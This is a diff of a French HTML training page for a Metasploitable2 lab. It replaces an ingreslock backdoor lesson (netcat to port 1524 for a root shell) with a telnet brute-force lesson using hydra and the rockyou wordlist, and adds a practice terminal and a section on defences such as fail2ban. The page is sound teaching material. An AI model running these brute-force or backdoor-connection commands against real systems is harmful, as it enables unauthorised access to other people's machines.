@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Ingreslock — Backdoor triviale</title>
+<title>Telnet — Bruteforce</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="lab.css">
@@ -13,16 +13,16 @@
   <div class="wrap">
     <div class="hero">
       <p class="breadcrumb"><a href="index.html">← Hub</a></p>
-      <p class="kicker">metasploitable2 :: recon → exploitation directe</p>
-      <h1>Ingreslock<br>Backdoor triviale</h1>
-      <p class="lead">Deuxième exploit du lab. Pas de module à charger : un service écoute sur un port non standard et n'attend qu'une chose, qu'on s'y connecte. Le travail se fait presque entièrement en amont, en reconnaissance.</p>
+      <p class="kicker">metasploitable2 :: auth faible → bruteforce → shell</p>
+      <h1>Telnet<br>Bruteforce</h1>
+      <p class="lead">Aucune faille logicielle ici : un service en clair, des identifiants faibles, et une absence totale de limitation des tentatives. L'attaque tient en une commande.</p>
       <div class="meta-row">
         <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
         <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
         <div class="meta-item"><span class="label">Réseau</span><span class="value">Réseau interne VirtualBox (isolé)</span></div>
-        <div class="meta-item"><span class="label">Résultat</span><span class="badge">root obtenu</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">shell utilisateur (msfadmin)</span></div>
         <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">1/10 · Introduction</span></div>
-        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff5c72; border:1px solid #ff5c72; background:#ff5c7218;">4/5 · Contrôle total</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff8a5c; border:1px solid #ff8a5c; background:#ff8a5c18;">3/5 · Shell utilisateur</span></div>
       </div>
     </div>
   </div>
@@ -30,29 +30,29 @@
   <div class="wrap">
     <section id="chrono">
       <h2 class="section-title">Chronologie</h2>
-      <p class="section-intro">Quatre étapes, dont trois de reconnaissance. C'est le cœur du cours : repérer ce qui ne devrait pas être là.</p>
+      <p class="section-intro">Quatre étapes. La substance n'est pas dans hydra — elle est dans ce qu'elle révèle sur la configuration du service.</p>
 
       <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
       <div class="playbook">
         <div class="playbook-row">
           <div class="playbook-num">1</div>
           <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
-          <div class="playbook-why">Lister tous les ports ouverts. Un service qui n'a rien à faire là saute aux yeux.</div>
+          <div class="playbook-why">Lister tous les services. Repérer telnet, protocole en clair sur le port 23.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">2</div>
           <div class="playbook-what"><strong>Choix du port</strong><span>reconnaissance visuelle</span></div>
-          <div class="playbook-why">Repérer le port non standard au nom de service inconnu (ingreslock?).</div>
+          <div class="playbook-why">Cibler le port 23 : un service qui ne chiffre rien et n'a pas de limite de tentatives.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">3</div>
-          <div class="playbook-what"><strong>Connexion directe</strong><span>nc IP PORT</span></div>
-          <div class="playbook-why">Pas de module, pas d'exploit : une simple connexion TCP brute suffit à récupérer le shell.</div>
+          <div class="playbook-what"><strong>Bruteforce</strong><span>hydra -l msfadmin -P ...</span></div>
+          <div class="playbook-why">Un seul login connu, un dictionnaire standard, une cible telnet://.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">4</div>
-          <div class="playbook-what"><strong>Post-exploitation</strong><span>whoami / id</span></div>
-          <div class="playbook-why">Vérifier l'identité obtenue, puis explorer librement.</div>
+          <div class="playbook-what"><strong>Connexion et vérification</strong><span>telnet / whoami</span></div>
+          <div class="playbook-why">Ouvrir une session interactive avec les identifiants trouvés, vérifier l'identité obtenue.</div>
         </div>
       </div>
 
@@ -61,7 +61,7 @@
         <div class="step">
           <div class="step-num">1</div>
           <h3>Reconnaissance complète — nmap</h3>
-          <p class="step-sub">Lister tous les ports ouverts, sans filtre ni préjugé.</p>
+          <p class="step-sub">Lister tous les ports ouverts. On repère ensuite celui qui nous intéresse.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
             <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
@@ -90,55 +90,67 @@
           </div>
           <div class="explain">
             <span class="k">-sV</span><span class="v">détecte la version de chaque service.</span>
-            <span class="k">-sC</span><span class="v">lance les scripts NSE par défaut.</span>
-            <span class="k">triage</span><span class="v">On cherche les services qui <strong>sortent de l'ordinaire</strong> : nom inconnu, port non standard, version indéterminée.</span>
+            <span class="k">-sC</span><span class="v">scripts NSE par défaut.</span>
+            <span class="k">triage</span><span class="v">On cherche un service simple à attaquer : pas de chiffrement, pas de verrouillage, mots de passe faibles.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">2</div>
           <h3>Choix du port à cibler</h3>
-          <p class="step-sub">Un service saute aux yeux : un nom inconnu sur un port qui n'a rien à faire là.</p>
+          <p class="step-sub">Un service se démarque : protocole en clair, connu pour ne pas imposer de limite de tentatives.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>rappel de la sortie nmap</div>
-            <pre><span class="out">1524/tcp open  ingreslock?</span>
+            <pre><span class="out">23/tcp   open  telnet      Linux telnetd</span>
 <span class="out">…</span></pre>
           </div>
           <div class="explain">
-            <span class="k">indice</span><span class="v">Le point d'interrogation signale que nmap n'a pas pu identifier clairement le service. Le nom « ingreslock » est un service obsolète associé à une base de données — aucune base Ingres ne tourne sur cette machine.</span>
-            <span class="k">à retenir</span><span class="v">Un service qui ne devrait pas être là est un signal direct.</span>
+            <span class="k">indice</span><span class="v">Un service en clair, sur un port bien identifié, sur un système ancien.</span>
+            <span class="k">à retenir</span><span class="v">Un service qui n'a aucune protection contre les tentatives répétées est le candidat idéal pour un bruteforce.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">3</div>
-          <h3>Connexion directe — netcat</h3>
-          <p class="step-sub">Pas de module, pas d'exploit : une simple connexion TCP brute suffit.</p>
+          <h3>Bruteforce — hydra</h3>
+          <p class="step-sub">Un seul utilisateur connu (msfadmin), dictionnaire standard Kali (rockyou).</p>
+          <div class="prereq">
+            <span class="prereq-tag">⚠ sur une vraie Kali</span>
+            <span>
+              Sur une installation récente, <code>rockyou.txt</code> est livré compressé (<code>rockyou.txt.gz</code>) — hydra ne trouvera pas le fichier tant qu'il n'est pas décompressé. Avant de lancer la commande :<br>
+              <code>ls -lh /usr/share/wordlists/</code><br>
+              <code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>
+            </span>
+          </div>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> nc 192.168.56.20 1524<button class="copy-btn" type="button" data-copy="nc 192.168.56.20 1524" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">root@metasploitable:/# </span><span class="out">whoami</span>
-<span class="ok">root</span></pre>
+            <pre><span class="prompt">$</span> hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.20<button class="copy-btn" type="button" data-copy="hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Hydra v9.5 (c) 2023 by van Hauser/THC</span>
+<span class="out">[DATA] attacking telnet://192.168.56.20:23/</span>
+<span class="ok">[23][telnet] host: 192.168.56.20   login: msfadmin   password: msfadmin</span>
+<span class="out">1 of 1 target successfully completed, 1 valid password found</span></pre>
           </div>
           <div class="explain">
-            <span class="k">nc</span><span class="v">netcat ouvre une connexion TCP brute. Aucune négociation de protocole, aucun handshake applicatif.</span>
-            <span class="k">résultat</span><span class="v">Le service renvoie un <strong>prompt shell direct</strong>, sans mot de passe ni session préalable. La connexion elle-même est l'exploit.</span>
-            <span class="k">telnet</span><span class="v">telnet 192.168.56.20 1524 fonctionne aussi — netcat est simplement plus direct.</span>
+            <span class="k">-l</span><span class="v">un seul login à tester (minuscule L). On sait déjà que msfadmin existe.</span>
+            <span class="k">-P</span><span class="v">fichier de mots de passe (majuscule P). Chaque ligne est essayée.</span>
+            <span class="k">telnet://</span><span class="v">précise le protocole cible — hydra sait comment se connecter.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">4</div>
-          <h3>Post-exploitation</h3>
-          <p class="step-sub">Vérifier l'identité obtenue, puis explorer ce qui est accessible.</p>
+          <h3>Connexion et vérification</h3>
+          <p class="step-sub">Utiliser les identifiants trouvés, puis confirmer l'identité effective.</p>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>root@metasploitable</div>
-            <pre><span class="prompt">#</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> telnet 192.168.56.20<button class="copy-btn" type="button" data-copy="telnet 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">metasploitable login: </span><span class="ok">msfadmin</span>
+<span class="out">Password: </span><span class="ok">msfadmin</span>
+<span class="ok">msfadmin@metasploitable:~$</span></pre>
           </div>
           <div class="explain">
-            <span class="k">id</span><span class="v">confirme l'identité effective : <strong>uid=0(root)</strong>. Le shell est celui d'un service lancé en root — accès direct au compte administrateur.</span>
-            <span class="k">méthode</span><span class="v">Toujours vérifier l'identité avant d'agir, même quand le prompt semble clair.</span>
+            <span class="k">telnet IP</span><span class="v">ouvre une session interactive ; contrairement à netcat, telnet négocie le protocole et permet de saisir login/mot de passe.</span>
+            <span class="k">leçon</span><span class="v">La force de l'attaque tenait à la faiblesse du mot de passe et à l'absence de limitation. Le protocole en clair aggrave tout.</span>
           </div>
         </div>
 
@@ -147,30 +159,27 @@
 
     <section id="cheatsheet">
       <h2 class="section-title">Commandes à retenir</h2>
-      <p class="section-intro">Le strict nécessaire — ce cours tient en une commande d'exploitation.</p>
+      <p class="section-intro">Le strict nécessaire.</p>
 
       <div class="cheat-group">
         <h4>reconnaissance</h4>
         <table class="cheat">
-          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports ouverts + versions + scripts de base</td></tr>
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions + scripts NSE</td></tr>
         </table>
       </div>
 
       <div class="cheat-group">
-        <h4>connexion directe</h4>
+        <h4>bruteforce</h4>
         <table class="cheat">
-          <tr><td class="cmd">nc IP PORT</td><td class="desc">ouvrir une connexion TCP brute (netcat)</td></tr>
-          <tr><td class="cmd">telnet IP PORT</td><td class="desc">alternative à netcat — même résultat ici</td></tr>
+          <tr><td class="cmd">hydra -l USER -P WORDLIST telnet://IP</td><td class="desc">test d'un login unique contre un dictionnaire</td></tr>
         </table>
       </div>
 
       <div class="cheat-group">
-        <h4>post-exploitation</h4>
+        <h4>connexion &amp; post-exploitation</h4>
         <table class="cheat">
-          <tr><td class="cmd">whoami</td><td class="desc">identité courante</td></tr>
-          <tr><td class="cmd">id</td><td class="desc">identité + groupes</td></tr>
-          <tr><td class="cmd">pwd</td><td class="desc">répertoire courant</td></tr>
-          <tr><td class="cmd">ls /</td><td class="desc">explorer la racine</td></tr>
+          <tr><td class="cmd">telnet IP</td><td class="desc">ouvrir une session interactive</td></tr>
+          <tr><td class="cmd">whoami / id</td><td class="desc">identité courante et groupes</td></tr>
         </table>
       </div>
     </section>
@@ -179,36 +188,36 @@
       <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
       <div class="concepts">
         <div class="concept">
-          <h4>Une backdoor n'est pas toujours une archive piégée</h4>
-          <p>Le cours #1 montrait une archive modifiée après compromission de la chaîne de distribution. Ici, c'est plus simple : le service a été délibérément configuré pour écouter sur un port et renvoyer un shell. Aucun code malveillant caché — juste un service qui n'aurait jamais dû être exposé.</p>
+          <h4>Le bruteforce n'est pas une faille, c'est une configuration</h4>
+          <p>hydra ne découvre aucune vulnérabilité dans telnetd. Il exploite une <strong>absence de protection</strong> : le service accepte un nombre illimité de tentatives.</p>
         </div>
         <div class="concept">
-          <h4>Reconnaissance : l'anomalie plutôt que la vulnérabilité</h4>
-          <p>Un scanner liste des dizaines de ports. Tous ne sont pas des failles. Certains — comme ingreslock sur ce port — sont des <strong>anomalies de configuration</strong>. Le travail du pentester est de repérer ce qui sort de l'ordinaire.</p>
+          <h4>Protocole en clair : un double problème</h4>
+          <p>telnet transmet tout sans chiffrement, y compris les identifiants. Un sniffer aurait vu le mot de passe correct passer pendant la connexion réussie.</p>
         </div>
         <div class="concept">
-          <h4>Shell direct vs shell reverse</h4>
-          <p>Le cours #1 utilisait un reverse shell : la cible rappelait l'attaquant. Ici, c'est un shell <strong>direct</strong> : la cible écoute passivement et n'importe qui s'y connecte obtient un prompt. Pas de gestion de LHOST, pas de payload à envoyer.</p>
+          <h4>Attaque ciblée vs attaque aveugle</h4>
+          <p>hydra peut tester des milliers de logins. Ici, on connaît déjà msfadmin — l'attaque est chirurgicale. Le dictionnaire n'a même pas besoin d'être énorme.</p>
         </div>
       </div>
     </section>
 
     <section id="anatomie">
-      <h2 class="section-title">Anatomie de la backdoor</h2>
-      <p class="section-intro">Pourquoi un service peut se retrouver à exposer un shell root sans qu'aucun code malveillant n'ait été injecté.</p>
+      <h2 class="section-title">Anatomie du bruteforce</h2>
+      <p class="section-intro">Pourquoi cette attaque fonctionne sur telnet — et pourquoi elle ne fonctionnerait pas sur SSH configuré correctement.</p>
 
       <div class="concepts">
         <div class="concept">
-          <h4>Un service lancé en root</h4>
-          <p>Sur Metasploitable 2, le port 1524 est associé à un démon démarré avec les privilèges root. Ce n'est pas une faille du démon lui-même — c'est son <strong>mode de déploiement</strong> qui est dangereux.</p>
+          <h4>Absence de limitation des tentatives</h4>
+          <p>telnetd ne compte pas les échecs, n'impose aucun délai, ne verrouille jamais le compte. Un service qui bloque après 5 échecs rendrait un dictionnaire de 14 millions de mots de passe totalement inutile.</p>
         </div>
         <div class="concept">
-          <h4>Le port 1524/tcp</h4>
-          <p>Officiellement réservé à <strong>ingreslock</strong>, un service de verrouillage pour la base de données Ingres. Sur cette machine, aucun SGBD Ingres n'est installé — le port a été réutilisé pour autre chose. C'est cette incohérence qui doit déclencher l'investigation.</p>
+          <h4>Identification préalable des comptes valides</h4>
+          <p>Telnet ne protège pas l'existence des comptes : un login inexistant et un login existant avec mauvais mot de passe produisent des réponses différentes. Une énumération préalable suffit.</p>
         </div>
         <div class="concept">
-          <h4>Ce qu'il n'y a pas à faire</h4>
-          <p>Aucun exploit à chercher, aucun module à charger, aucun payload à configurer. La connexion netcat <em>est</em> l'exploit. C'est volontairement l'un des cours les plus simples du lab.</p>
+          <h4>Pourquoi le mot de passe est « msfadmin »</h4>
+          <p>Metasploitable 2 est volontairement vulnérable. Les comptes par défaut ont des mots de passe triviaux, souvent identiques au login. Un bruteforce n'a même pas besoin de forcer : il suffit de tester les évidences.</p>
         </div>
       </div>
     </section>
@@ -219,17 +228,17 @@
 
       <div class="cheat-group">
         <table class="cheat">
-          <tr><td class="cmd">netstat -tulpn / ss -tulpn</td><td class="desc">lister tous les ports en écoute et le processus associé — détecte immédiatement qu'un démon non reconnu écoute sur 1524</td></tr>
-          <tr><td class="cmd">lsof -i :1524</td><td class="desc">identifier quel processus a ouvert le port 1524 et sous quel compte</td></tr>
-          <tr><td class="cmd">règle IDS (Snort/Suricata)</td><td class="desc">détecter une connexion entrante sur 1524/tcp — aucun trafic légitime ne devrait y transiter</td></tr>
-          <tr><td class="cmd">moindre privilège</td><td class="desc">ne jamais lancer un service avec les droits root s'il n'en a pas strictement besoin</td></tr>
+          <tr><td class="cmd">grep "FAILED LOGIN" /var/log/auth.log</td><td class="desc">détecter une rafale d'échecs sur le même compte</td></tr>
+          <tr><td class="cmd">fail2ban avec filtre telnet</td><td class="desc">bloquer l'IP source après N échecs — contre-mesure directe</td></tr>
+          <tr><td class="cmd">désactiver telnet, passer à SSH</td><td class="desc">SSH chiffre la session ET l'authentification</td></tr>
+          <tr><td class="cmd">politique de mots de passe</td><td class="desc">interdire les mots de passe triviaux / identiques au login</td></tr>
         </table>
       </div>
     </section>
 
     <section id="practice">
       <h2 class="section-title">Terminal d'entraînement</h2>
-      <p class="section-intro">Rejoue la chaîne complète : lire la sortie nmap, repérer le port suspect, s'y connecter, vérifier l'identité obtenue, puis explorer librement.</p>
+      <p class="section-intro">Rejoue la chaîne : lire la sortie nmap, choisir le port 23, lancer hydra, se connecter, vérifier l'identité.</p>
 
       <div class="term-launch">
         <button class="term-launch-btn" id="term-open-btn" type="button">
@@ -293,14 +302,14 @@
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
       task:"Lance une reconnaissance complète sur la cible.",
       accepted:["nmap -sv -sc 192.168.56.20"],
-      hint:"Même outil que le cours #1 : -sV détecte les versions, -sC lance les scripts NSE par défaut. Un seul paramètre : l'IP de la cible.",
-      hint2:"nmap -sV -sC 192.168.56.20 — la liste des ports va servir au triage.",
-      note:"nmap -sV -sC &lt;cible&gt; → point de départ standard de tout pentest : toutes les versions + scripts NSE.",
+      hint:"Même outil que dans les cours précédents. -sV pour les versions, -sC pour les scripts NSE par défaut.",
+      hint2:"nmap -sV -sC 192.168.56.20",
+      note:"nmap -sV -sC &lt;cible&gt; → toutes les versions + scripts NSE, point de départ standard.",
       output:[
         {t:"PORT     STATE SERVICE     VERSION", c:"o"},
         {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o"},
         {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", c:"o"},
-        {t:"23/tcp   open  telnet      Linux telnetd", c:"o"},
+        {t:"23/tcp   open  telnet      Linux telnetd", c:"o", id:"hl-telnet"},
         {t:"25/tcp   open  smtp        Postfix smtpd", c:"o"},
         {t:"80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)", c:"o"},
         {t:"111/tcp  open  rpcbind     2 (RPC #100000)", c:"o"},
@@ -310,27 +319,83 @@
         {t:"513/tcp  open  login?", c:"o"},
         {t:"514/tcp  open  shell       Netkit rshd", c:"o"},
         {t:"1099/tcp open  java-rmi    GNU Classpath grmiregistry", c:"o"},
-        {t:"1524/tcp open  ingreslock?", c:"o", id:"hl-ingreslock"},
+        {t:"1524/tcp open  ingreslock?", c:"o"},
         {t:"2049/tcp open  nfs         2-4 (RPC #100003)", c:"o"},
         {t:"3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5", c:"o"},
         {t:"5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7", c:"o"},
         {t:"5900/tcp open  vnc         VNC (protocol 3.3)", c:"o"},
-        {t:"6000/tcp open  X11         (access denied)", c:"o"},
         {t:"6667/tcp open  irc         UnrealIRCd", c:"o"},
-        {t:"8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)", c:"o"},
         {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
       ] },
 
     { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Un service sort du lot. Tape son numéro de port.",
-      accepted:["1524"],
+      task:"Un service est un candidat idéal pour un bruteforce. Tape son numéro de port.",
+      accepted:["23"],
       wrongAnswers:{
-        "21":"vsftpd a sa propre faille — mais ce n'est pas l'anomalie la plus flagrante ici.",
-        "22":"SSH est normal et attendu sur un serveur — rien d'anormal.",
-        "80":"Apache tourne, mais rien d'exploitable immédiatement.",
-        "6667":"IRC est intéressant, mais un autre service n'a rien à faire du tout sur cette machine."
+        "21":"vsftpd a une backdoor — c'est un autre cours.",
+        "22":"SSH est chiffré et plus lourd à bruteforcer. Cherche un protocole en clair.",
+        "80":"Apache n'est pas notre cible ici.",
+        "3306":"MySQL demande des identifiants — on cherche un service qui ne les protège pas."
       },
-      hint:"Cherche un nom de service qui ne correspond à rien de légitime sur cette machine, sur un port non standard.",
-      hint2:"1524/tcp « ingreslock? » : aucun SGBD Ingres n'est installé, le nom du service ne correspond à rien de légitime.",
-      highlightIds:["hl-ingreslock"],
-      note:"Un port qui sort de l'ordinaire (nom inconnu, numéro non standard) est un
+      hint:"Cherche un protocole en clair sur un système ancien, sans limitation de tentatives.",
+      hint2:"Le port 23 = telnet. Protocole en clair, aucune protection contre les tentatives répétées.",
+      highlightIds:["hl-telnet"],
+      note:"Le protocole telnet envoie tout en clair et n'offre aucune limitation de tentatives — candidat idéal pour un bruteforce par dictionnaire.",
+      output:[] },
+
+    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"$",
+      task:"Lance un bruteforce sur le compte msfadmin, dictionnaire rockyou, cible telnet.",
+      accepted:["hydra -l msfadmin -p /usr/share/wordlists/rockyou.txt telnet://192.168.56.20"],
+      hint:"hydra prend -l pour un login unique, -P (majuscule) pour le fichier de mots de passe, et une cible au format protocole://adresse.",
+      hint2:"hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.20",
+      note:"hydra -l &lt;login&gt; -P &lt;dictionnaire&gt; telnet://&lt;cible&gt; → attaque par dictionnaire sur un login unique.",
+      output:[
+        {t:"Hydra v9.5 (c) 2023 by van Hauser/THC", c:"o"},
+        {t:"[DATA] attacking telnet://192.168.56.20:23/", c:"o"},
+        {t:"[23][telnet] host: 192.168.56.20   login: msfadmin   password: msfadmin", c:"ok", id:"hl-hydra"},
+        {t:"1 of 1 target successfully completed, 1 valid password found", c:"ok"}
+      ] },
+
+    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"$",
+      task:"Connecte-toi au service telnet avec les identifiants trouvés.",
+      accepted:["telnet 192.168.56.20"],
+      hint:"Le client telnet porte le nom du protocole. Une fois connecté, saisis msfadmin comme login et mot de passe.",
+      hint2:"telnet 192.168.56.20",
+      note:"telnet &lt;cible&gt; → ouvre une session interactive ; contrairement à netcat, telnet négocie le protocole et permet de saisir login/mot de passe.",
+      output:[
+        {t:"Trying 192.168.56.20...", c:"o"},
+        {t:"Connected to 192.168.56.20.", c:"o"},
+        {t:"metasploitable login: msfadmin", c:"ok"},
+        {t:"Password: msfadmin", c:"ok"},
+        {t:"msfadmin@metasploitable:~$ ", c:"ok", id:"hl-shell"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"msfadmin@metasploitable", prompt:"$",
+      task:"Vérifie l'identité obtenue dans cette session.",
+      accepted:["whoami", "id"],
+      hint:"Une commande courte, déjà utilisée dans les cours précédents.",
+      hint2:"whoami affiche l'utilisateur ; id affiche aussi les groupes.",
+      note:"whoami → affiche l'utilisateur courant ; à vérifier après toute connexion pour connaître ses privilèges.",
+      output:[{t:"msfadmin", c:"ok"}] }
+  ];
+
+  let freeContext = "msfadmin@metasploitable";
+  const freeCommands = {
+    "msfadmin@metasploitable": {
+      "whoami": [{t:"msfadmin", c:"ok"}],
+      "id": [{t:"uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),115(lpadmin),118(admin),119(sambashare),1000(msfadmin)", c:"ok"}],
+      "pwd": [{t:"/home/msfadmin", c:"o"}],
+      "ls": [{t:"bin  boot  etc  home  root  tmp  usr  var", c:"o"}],
+      "ls /": [{t:"bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "exit": [{t:"logout", c:"o"}]
+    }
+  };
+
+  let freeHintHtml = "Session ouverte sous msfadmin. Tape <strong style=\"color:var(--text)\">whoami</strong>, <strong style=\"color:var(--text)\">id</strong>, <strong style=\"color:var(--text)\">ls /</strong> ou <strong style=\"color:var(--text)\">exit</strong>.";
+</script>
+<script src="engine.js"></script>
+
+</body>
+</html>
